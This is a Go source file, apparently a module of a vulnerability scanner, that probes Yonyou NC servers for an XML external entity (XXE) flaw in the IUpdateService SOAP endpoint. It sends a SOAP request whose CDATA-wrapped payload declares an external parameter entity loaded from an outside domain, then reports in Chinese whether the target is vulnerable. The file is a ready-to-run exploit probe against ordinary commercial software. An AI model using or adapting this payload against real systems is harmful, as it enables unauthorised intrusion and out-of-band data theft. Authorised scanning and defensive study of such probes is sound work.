package uapws_wsdl_XXE

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/uapws/service/nc.uap.oba.update.IUpdateService"
	xmlPayload := `<?xml version="1.0" encoding="UTF-8"?>
		<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService">
		<soapenv:Header/>
		<soapenv:Body>
		<iup:getResult>
		<!--type: string-->
		<iup:string><![CDATA[
		<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://rvbuzitqca.dgrh3.cn">%aaa;%ccc;%ddd;]>
		<xxx/>]]></iup:string>
		</iup:getResult>
		</soapenv:Body>
		</soapenv:Envelope>`

	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent":     UA,
		"SOAPAction":     "urn:getResult",
		"Content-Type":   "text/xml;charset=UTF-8",
		"Content-Length": "397",
	}).SetBody(xmlPayload).Post(url)

	if err != nil {
		color.Red.Println("[-] 用友 NC IUpdateService XXE漏洞不存在")
		return
	}

	responseBody, err := resp.ToString()
	if err != nil {
		color.Red.Println("[-] Error reading response body")
		return
	}

	if resp.Status == "200 OK" && strings.Contains(responseBody, "design") {
		color.Green.Println("[+] 用友 NC IUpdateService XXE漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 NC IUpdateService XXE漏洞不存在")
}
